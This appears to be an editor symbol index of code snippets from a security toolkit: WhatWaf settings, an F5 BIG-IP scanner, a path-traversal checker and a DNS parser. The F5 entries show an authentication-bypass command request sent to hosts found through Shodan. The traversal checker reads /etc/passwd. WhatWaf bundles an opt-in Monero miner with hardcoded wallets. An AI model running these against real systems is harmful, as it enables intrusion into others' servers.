        "documentation": {}
    },
    {
        "label": "YAML_FILE_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "YAML_FILE_PATH = \"{}/yaml_output\".format(HOME)\n# CSV data file path\nCSV_FILE_PATH = \"{}/csv_output\".format(HOME)\n# path to the mining home (must opt in first)\nOPTIONAL_MINING_FOLDER_PATH = \"{}/mining\".format(HOME)\n# path to the mining data\nOPTIONAL_MINING_CONFIG_PATH = \"{}/mine.json\".format(OPTIONAL_MINING_FOLDER_PATH)\n# where the miners sit (we'll mine using CPU only)\nOPTIONAL_MINING_MINERS = \"{}/miner\".format(OPTIONAL_MINING_FOLDER_PATH)\n# the file that will tell us if the miner is installed or not",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "CSV_FILE_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "CSV_FILE_PATH = \"{}/csv_output\".format(HOME)\n# path to the mining home (must opt in first)\nOPTIONAL_MINING_FOLDER_PATH = \"{}/mining\".format(HOME)\n# path to the mining data\nOPTIONAL_MINING_CONFIG_PATH = \"{}/mine.json\".format(OPTIONAL_MINING_FOLDER_PATH)\n# where the miners sit (we'll mine using CPU only)\nOPTIONAL_MINING_MINERS = \"{}/miner\".format(OPTIONAL_MINING_FOLDER_PATH)\n# the file that will tell us if the miner is installed or not\nOPTIONAL_MINING_LOCK_FILE = \"{}/.lock\".format(OPTIONAL_MINING_FOLDER_PATH)\n# whatwafs XMR wallets",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINING_FOLDER_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINING_FOLDER_PATH = \"{}/mining\".format(HOME)\n# path to the mining data\nOPTIONAL_MINING_CONFIG_PATH = \"{}/mine.json\".format(OPTIONAL_MINING_FOLDER_PATH)\n# where the miners sit (we'll mine using CPU only)\nOPTIONAL_MINING_MINERS = \"{}/miner\".format(OPTIONAL_MINING_FOLDER_PATH)\n# the file that will tell us if the miner is installed or not\nOPTIONAL_MINING_LOCK_FILE = \"{}/.lock\".format(OPTIONAL_MINING_FOLDER_PATH)\n# whatwafs XMR wallets\nOPTIONAL_MINING_WHATWAF_WALLETS = (\n    \"89FNiLsEWSidZNoyL1Mkg9Y7GEF5yoxB6cjRBx8SfZnMehtguwGiitzVDDpyPCSDoGfjjLsMcJaFaiKnQNWtkBi2BbrZe58\",",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINING_CONFIG_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINING_CONFIG_PATH = \"{}/mine.json\".format(OPTIONAL_MINING_FOLDER_PATH)\n# where the miners sit (we'll mine using CPU only)\nOPTIONAL_MINING_MINERS = \"{}/miner\".format(OPTIONAL_MINING_FOLDER_PATH)\n# the file that will tell us if the miner is installed or not\nOPTIONAL_MINING_LOCK_FILE = \"{}/.lock\".format(OPTIONAL_MINING_FOLDER_PATH)\n# whatwafs XMR wallets\nOPTIONAL_MINING_WHATWAF_WALLETS = (\n    \"89FNiLsEWSidZNoyL1Mkg9Y7GEF5yoxB6cjRBx8SfZnMehtguwGiitzVDDpyPCSDoGfjjLsMcJaFaiKnQNWtkBi2BbrZe58\",\n    \"83cJ5GyDAX6Ka4pYGqTCk5VQMLjP9kzQdUqU9aYkAQZnXR25viECfB8iTtr6r4FZaL3SW3mkmYxZS3M63tpwxzX4CxbXf7p\",\n    \"889bAk3qKG3UraUs1hnTGeJ6keJxppncoKYJh59wXW2YLiHcWYTAmJfQMVM3ZaH7Jh2CeBh3zfaRL9a7zTBQkwCj23YqKWQ\",",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINING_MINERS",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINING_MINERS = \"{}/miner\".format(OPTIONAL_MINING_FOLDER_PATH)\n# the file that will tell us if the miner is installed or not\nOPTIONAL_MINING_LOCK_FILE = \"{}/.lock\".format(OPTIONAL_MINING_FOLDER_PATH)\n# whatwafs XMR wallets\nOPTIONAL_MINING_WHATWAF_WALLETS = (\n    \"89FNiLsEWSidZNoyL1Mkg9Y7GEF5yoxB6cjRBx8SfZnMehtguwGiitzVDDpyPCSDoGfjjLsMcJaFaiKnQNWtkBi2BbrZe58\",\n    \"83cJ5GyDAX6Ka4pYGqTCk5VQMLjP9kzQdUqU9aYkAQZnXR25viECfB8iTtr6r4FZaL3SW3mkmYxZS3M63tpwxzX4CxbXf7p\",\n    \"889bAk3qKG3UraUs1hnTGeJ6keJxppncoKYJh59wXW2YLiHcWYTAmJfQMVM3ZaH7Jh2CeBh3zfaRL9a7zTBQkwCj23YqKWQ\",\n    \"85FBKFubwrfg3ag2isU3T5c4npfxL92TPBXmdbNa5VE4hgdsD8UuYhU3sr6EAhcUQxFMfj7uheaUjNSKAE3UsLtuQXAw1BA\",\n    \"82a4pbZwhayhgzJRCWAQPPBwk6oTBcKekbxCHLLsTYWLFyvZQY5jHnHbqb7fRpSosnLzow3sEJAjZJmMt9zEZnrQ3QJGgHf\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINING_LOCK_FILE",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINING_LOCK_FILE = \"{}/.lock\".format(OPTIONAL_MINING_FOLDER_PATH)\n# whatwafs XMR wallets\nOPTIONAL_MINING_WHATWAF_WALLETS = (\n    \"89FNiLsEWSidZNoyL1Mkg9Y7GEF5yoxB6cjRBx8SfZnMehtguwGiitzVDDpyPCSDoGfjjLsMcJaFaiKnQNWtkBi2BbrZe58\",\n    \"83cJ5GyDAX6Ka4pYGqTCk5VQMLjP9kzQdUqU9aYkAQZnXR25viECfB8iTtr6r4FZaL3SW3mkmYxZS3M63tpwxzX4CxbXf7p\",\n    \"889bAk3qKG3UraUs1hnTGeJ6keJxppncoKYJh59wXW2YLiHcWYTAmJfQMVM3ZaH7Jh2CeBh3zfaRL9a7zTBQkwCj23YqKWQ\",\n    \"85FBKFubwrfg3ag2isU3T5c4npfxL92TPBXmdbNa5VE4hgdsD8UuYhU3sr6EAhcUQxFMfj7uheaUjNSKAE3UsLtuQXAw1BA\",\n    \"82a4pbZwhayhgzJRCWAQPPBwk6oTBcKekbxCHLLsTYWLFyvZQY5jHnHbqb7fRpSosnLzow3sEJAjZJmMt9zEZnrQ3QJGgHf\"\n)\nOPTIONS_MINING_POOLS = (",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINING_WHATWAF_WALLETS",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINING_WHATWAF_WALLETS = (\n    \"89FNiLsEWSidZNoyL1Mkg9Y7GEF5yoxB6cjRBx8SfZnMehtguwGiitzVDDpyPCSDoGfjjLsMcJaFaiKnQNWtkBi2BbrZe58\",\n    \"83cJ5GyDAX6Ka4pYGqTCk5VQMLjP9kzQdUqU9aYkAQZnXR25viECfB8iTtr6r4FZaL3SW3mkmYxZS3M63tpwxzX4CxbXf7p\",\n    \"889bAk3qKG3UraUs1hnTGeJ6keJxppncoKYJh59wXW2YLiHcWYTAmJfQMVM3ZaH7Jh2CeBh3zfaRL9a7zTBQkwCj23YqKWQ\",\n    \"85FBKFubwrfg3ag2isU3T5c4npfxL92TPBXmdbNa5VE4hgdsD8UuYhU3sr6EAhcUQxFMfj7uheaUjNSKAE3UsLtuQXAw1BA\",\n    \"82a4pbZwhayhgzJRCWAQPPBwk6oTBcKekbxCHLLsTYWLFyvZQY5jHnHbqb7fRpSosnLzow3sEJAjZJmMt9zEZnrQ3QJGgHf\"\n)\nOPTIONS_MINING_POOLS = (\n    \"pool.supportxmr.com:3333\",\n    \"vegas-backup.xmrpool.net:3335\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONS_MINING_POOLS",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONS_MINING_POOLS = (\n    \"pool.supportxmr.com:3333\",\n    \"vegas-backup.xmrpool.net:3335\"\n)\nOPTIONAL_MINER_INSTALLER_SCRIPT_PATH = \"{}/install.sh\".format(OPTIONAL_MINING_FOLDER_PATH)\nOPTIONAL_MINER_SCRIPT_PATH = \"/tmp/xmrig/build/xmrig\"\nOPTIONAL_MINER_LOG_FILENAME = \"{}/{}.log\".format(OPTIONAL_MINING_MINERS, str(time.time()))\nOPTIONAL_MINER_INSTALLER_SCRIPT = \"\"\"#!/bin/bash\nfunction debianInstaller () {\n  sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINER_INSTALLER_SCRIPT_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINER_INSTALLER_SCRIPT_PATH = \"{}/install.sh\".format(OPTIONAL_MINING_FOLDER_PATH)\nOPTIONAL_MINER_SCRIPT_PATH = \"/tmp/xmrig/build/xmrig\"\nOPTIONAL_MINER_LOG_FILENAME = \"{}/{}.log\".format(OPTIONAL_MINING_MINERS, str(time.time()))\nOPTIONAL_MINER_INSTALLER_SCRIPT = \"\"\"#!/bin/bash\nfunction debianInstaller () {\n  sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\n  git clone https://github.com/xmrig/xmrig.git /tmp/xmrig\n  cd /tmp/xmrig && mkdir build && cd build\n  cmake ..\n  make",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINER_SCRIPT_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINER_SCRIPT_PATH = \"/tmp/xmrig/build/xmrig\"\nOPTIONAL_MINER_LOG_FILENAME = \"{}/{}.log\".format(OPTIONAL_MINING_MINERS, str(time.time()))\nOPTIONAL_MINER_INSTALLER_SCRIPT = \"\"\"#!/bin/bash\nfunction debianInstaller () {\n  sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\n  git clone https://github.com/xmrig/xmrig.git /tmp/xmrig\n  cd /tmp/xmrig && mkdir build && cd build\n  cmake ..\n  make\n}",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINER_LOG_FILENAME",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINER_LOG_FILENAME = \"{}/{}.log\".format(OPTIONAL_MINING_MINERS, str(time.time()))\nOPTIONAL_MINER_INSTALLER_SCRIPT = \"\"\"#!/bin/bash\nfunction debianInstaller () {\n  sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\n  git clone https://github.com/xmrig/xmrig.git /tmp/xmrig\n  cd /tmp/xmrig && mkdir build && cd build\n  cmake ..\n  make\n}\nfunction fedoraInstaller () {",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "OPTIONAL_MINER_INSTALLER_SCRIPT",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "OPTIONAL_MINER_INSTALLER_SCRIPT = \"\"\"#!/bin/bash\nfunction debianInstaller () {\n  sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\n  git clone https://github.com/xmrig/xmrig.git /tmp/xmrig\n  cd /tmp/xmrig && mkdir build && cd build\n  cmake ..\n  make\n}\nfunction fedoraInstaller () {\n  sudo dnf install -y git cmake gcc gcc-c++ libuv-static libstdc++-static libmicrohttpd-devel",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "UNPROCESSED_ISSUES_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "UNPROCESSED_ISSUES_PATH = \"{}/unprocessed_issues\".format(HOME)\n# request token path\ntry:\n    TOKEN_PATH = \"{}/content/files/auth.key\".format(CUR_DIR)\n    open(TOKEN_PATH).close()\nexcept IOError:\n    TOKEN_PATH = \"{}/files/auth.key\".format(HOME)\n# known POST strings (I'll probably think of more later)\ntry:\n    POST_STRING_NAMES_PATH = \"{}/content/files/post_strings.lst\".format(CUR_DIR)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "DATABASE_FILENAME",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "DATABASE_FILENAME = \"{}/whatwaf.sqlite\".format(HOME)\n# payloads that have been exported from database cache\nEXPORTED_PAYLOADS_PATH = \"{}/payload_exports\".format(HOME)\n# default payloads path\ntry:\n    DEFAULT_PAYLOAD_PATH = \"{}/content/files/default_payloads.lst\".format(CUR_DIR)\n    open(DEFAULT_PAYLOAD_PATH).close()\nexcept IOError:\n    DEFAULT_PAYLOAD_PATH = \"{}/files/default_payloads.lst\".format(HOME)\n# default user-agent",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "EXPORTED_PAYLOADS_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "EXPORTED_PAYLOADS_PATH = \"{}/payload_exports\".format(HOME)\n# default payloads path\ntry:\n    DEFAULT_PAYLOAD_PATH = \"{}/content/files/default_payloads.lst\".format(CUR_DIR)\n    open(DEFAULT_PAYLOAD_PATH).close()\nexcept IOError:\n    DEFAULT_PAYLOAD_PATH = \"{}/files/default_payloads.lst\".format(HOME)\n# default user-agent\nDEFAULT_USER_AGENT = \"whatwaf/{} (Language={}; Platform={})\".format(\n    VERSION, sys.version.split(\" \")[0], platform.platform().split(\"-\")[0]",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_USER_AGENT",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "DEFAULT_USER_AGENT = \"whatwaf/{} (Language={}; Platform={})\".format(\n    VERSION, sys.version.split(\" \")[0], platform.platform().split(\"-\")[0]\n)\n# arguments that need to be blocked from issue creations and waf creations\nSENSITIVE_ARGUMENTS = (\"--proxy\", \"-u\", \"--url\", \"-D\", \"--data\", \"--pa\", \"-b\", \"--burp\")\n# payloads for detecting the WAF, at least one of\n# these payloads `should` trigger the WAF and provide\n# us with the information we need to identify what\n# the WAF is, along with the information we will need\n# to identify what tampering method we should use",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "SENSITIVE_ARGUMENTS",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "SENSITIVE_ARGUMENTS = (\"--proxy\", \"-u\", \"--url\", \"-D\", \"--data\", \"--pa\", \"-b\", \"--burp\")\n# payloads for detecting the WAF, at least one of\n# these payloads `should` trigger the WAF and provide\n# us with the information we need to identify what\n# the WAF is, along with the information we will need\n# to identify what tampering method we should use\n# they are located in ./content/files/default_payloads.lst\nWAF_REQUEST_DETECTION_PAYLOADS = [p.strip() for p in open(DEFAULT_PAYLOAD_PATH).readlines()]\n# random home pages to try and get cookies\nRAND_HOMEPAGES = (",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "WAF_REQUEST_DETECTION_PAYLOADS",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "WAF_REQUEST_DETECTION_PAYLOADS = [p.strip() for p in open(DEFAULT_PAYLOAD_PATH).readlines()]\n# random home pages to try and get cookies\nRAND_HOMEPAGES = (\n    \"index.php\", \"index.exe\", \"index.html\", \"index.py\", \"index.pl\", \"index.exe\",\n    \"phpadmin.php\", \"home.php\", \"home.html\", \"home.py\", \"home.pl\", \"home.exe\",\n    \"phpcmd.exe\", \"index.phpcmd.exe\", \"index.html\", \"index.htm\", \"index.shtml\",\n    \"index.php\", \"index.php5\", \"index.php5.exe\", \"index.php4.exe\", \"index.php4\",\n    \"index.php3\", \"index.cgi\", \"default.html\", \"default.htm\", \"home.html\", \"home.htm\",\n    \"Index.html\", \"Index.htm\", \"Index.shtml\", \"Index.php\", \"Index.cgi\", \"Default.html\",\n    \"Default.htm\", \"Home.html\", \"Home.htm\", \"placeholder.html\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "RAND_HOMEPAGES",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "RAND_HOMEPAGES = (\n    \"index.php\", \"index.exe\", \"index.html\", \"index.py\", \"index.pl\", \"index.exe\",\n    \"phpadmin.php\", \"home.php\", \"home.html\", \"home.py\", \"home.pl\", \"home.exe\",\n    \"phpcmd.exe\", \"index.phpcmd.exe\", \"index.html\", \"index.htm\", \"index.shtml\",\n    \"index.php\", \"index.php5\", \"index.php5.exe\", \"index.php4.exe\", \"index.php4\",\n    \"index.php3\", \"index.cgi\", \"default.html\", \"default.htm\", \"home.html\", \"home.htm\",\n    \"Index.html\", \"Index.htm\", \"Index.shtml\", \"Index.php\", \"Index.cgi\", \"Default.html\",\n    \"Default.htm\", \"Home.html\", \"Home.htm\", \"placeholder.html\"\n)\n# this is a regex to validate a URL. It was taken from Django's URL validation technique",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "URL_VALIDATION",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "URL_VALIDATION = re.compile(\n    r'^(?:http|ftp)s?://'  # http:// or https://\n    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|'  # domain...\n    r'localhost|'  # localhost...\n    r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'  # ...or ip\n    r'(?::\\d+)?'  # optional port\n    r'(?:/?|[/?]\\S+)$', re.IGNORECASE\n)\nclass InvalidURLProvided(Exception): pass\nclass HTTP_HEADER:",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "tools.whatwaf.trigger.main",
        "description": "tools.whatwaf.trigger.main",
        "peekOfCode": "def main():\n    opt = WhatWafParser().cmd_parser()\n    start_time = timeit.default_timer()\n    if not len(sys.argv) > 1:\n        error(\"you failed to provide an option, redirecting to help menu\")\n        time.sleep(2)\n        cmd = \"whatwaf --help\"\n        subprocess.call(shlex.split(cmd))\n        exit(0)\n    # if you feel that you have to many folders or files in the whatwaf home folder",
        "detail": "tools.whatwaf.trigger.main",
        "documentation": {}
    },
    {
        "label": "needs_username_fix",
        "kind": 5,
        "importPath": "tools.whatwaf.setup",
        "description": "tools.whatwaf.setup",
        "peekOfCode": "needs_username_fix = os.getuid() == 0\ntry:\n    if needs_username_fix:\n        username = raw_input(\"what is your username (needed for directory fixes): \")\n    else:\n        username = getpass.getuser()\n    subprocess.call([\"bash\", \"install_helper.sh\"])\n    setup(\n        name='whatwaf',\n        version=VERSION,",
        "detail": "tools.whatwaf.setup",
        "documentation": {}
    },
    {
        "label": "SHODAN_API_KEY",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "SHODAN_API_KEY = \"\"\napi = shodan.Shodan(SHODAN_API_KEY)\nbanner = \"\"\"\n███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗\n██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║\n█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║\n██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║\n██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║\n╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝\n                                                      by: c0deninja",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "api",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "api = shodan.Shodan(SHODAN_API_KEY)\nbanner = \"\"\"\n███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗\n██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║\n█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║\n██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║\n██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║\n╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝\n                                                      by: c0deninja\n\"\"\"",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "banner = \"\"\"\n███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗\n██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║\n█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║\n██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║\n██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║\n╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝\n                                                      by: c0deninja\n\"\"\"\nprint(f\"{Fore.CYAN}{banner}\")",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "useragent_list",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "useragent_list = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36\"",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "headers",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "headers = {\n    \"User-Agent\": random.choice(useragent_list),\n    'Content-Type': 'application/json',\n    'Connection': 'keep-alive, x-F5-Auth-Token',\n    'X-F5-Auth-Token': 'abc',\n    'Authorization': 'Basic YWRtaW46'\n}\ndata = {'command': \"run\",'utilCmdArgs':\"-c id\"}\ntry:\n    results = api.search('http.title:\"BIG-IP&reg;-+Redirect\" +\"Server\" product:\"F5 BIG-IP\"')",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "data",
        "kind": 5,
        "importPath": "tools.f5bigip_scanner",
        "description": "tools.f5bigip_scanner",
        "peekOfCode": "data = {'command': \"run\",'utilCmdArgs':\"-c id\"}\ntry:\n    results = api.search('http.title:\"BIG-IP&reg;-+Redirect\" +\"Server\" product:\"F5 BIG-IP\"')\n    ips = []\n    for result in results['matches']:\n        ips.append(result['ip_str'])\n        with open(\"f5bigip.txt\", \"w\") as f:\n            for ip_address in ips:\n                f.writelines(f\"{ip_address}\\n\")\n    with open(\"f5bigip.txt\", \"r\") as get_ips:",
        "detail": "tools.f5bigip_scanner",
        "documentation": {}
    },
    {
        "label": "user_agent_",
        "kind": 5,
        "importPath": "tools.pathhunt",
        "description": "tools.pathhunt",
        "peekOfCode": "user_agent_ = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\nheader = {\"User-Agent\": user_agent_}\nparser = argparse.ArgumentParser()\nparser.add_argument('-t', '--target',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nparser.add_argument('-p', '--parameters',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nargs = parser.parse_args()",
        "detail": "tools.pathhunt",
        "documentation": {}
    },
    {
        "label": "header",
        "kind": 5,
        "importPath": "tools.pathhunt",
        "description": "tools.pathhunt",
        "peekOfCode": "header = {\"User-Agent\": user_agent_}\nparser = argparse.ArgumentParser()\nparser.add_argument('-t', '--target',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nparser.add_argument('-p', '--parameters',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nargs = parser.parse_args()\nif args.target:",
        "detail": "tools.pathhunt",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "tools.pathhunt",
        "description": "tools.pathhunt",
        "peekOfCode": "parser = argparse.ArgumentParser()\nparser.add_argument('-t', '--target',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nparser.add_argument('-p', '--parameters',\n                   help=\"Target to scan\",\n                   metavar=\"https://www.domain.com\")\nargs = parser.parse_args()\nif args.target:\n    cdir = os.getcwd()",
        "detail": "tools.pathhunt",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "tools.pathhunt",
        "description": "tools.pathhunt",
        "peekOfCode": "args = parser.parse_args()\nif args.target:\n    cdir = os.getcwd()\n    with open(f\"{cdir}/payloads/traversal.txt\", \"r\") as f:\n        path_traversal_list = [x.strip() for x in f.readlines()]\n    vulnerable = []\n    for path_traversal in path_traversal_list:\n        s = requests.Session()\n        r = s.get(f\"{args.target}{path_traversal}\", verify=False, headers=header)\n        if r.status_code == 200 and \"root:x:\" in r.text:",
        "detail": "tools.pathhunt",
        "documentation": {}
    },
    {
        "label": "load_json",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def load_json(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            data = json.load(file)\n        return data\n    except FileNotFoundError:\n        print(f\"Error: The file {file_path} does not exist.\")\n    except json.JSONDecodeError as e:\n        print(f\"Error decoding JSON: {e}\")\n    return None",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "extract_a_records",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def extract_a_records(data):\n    return data.get('a', [])\ndef extract_mx_records(data):\n    return data.get('mx', [])\ndef extract_txt_records(data):\n    return data.get('txt', [])\ndef extract_resolvers(data):\n    return data.get('resolver', [])\ndef extract_soa_records(data):\n    return data.get('soa', [])",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "extract_mx_records",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def extract_mx_records(data):\n    return data.get('mx', [])\ndef extract_txt_records(data):\n    return data.get('txt', [])\ndef extract_resolvers(data):\n    return data.get('resolver', [])\ndef extract_soa_records(data):\n    return data.get('soa', [])\ndef save_to_file(items, output_file, header=None):\n    try:",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "extract_txt_records",
        "kind": 2,
        "importPath": "dnsparser",
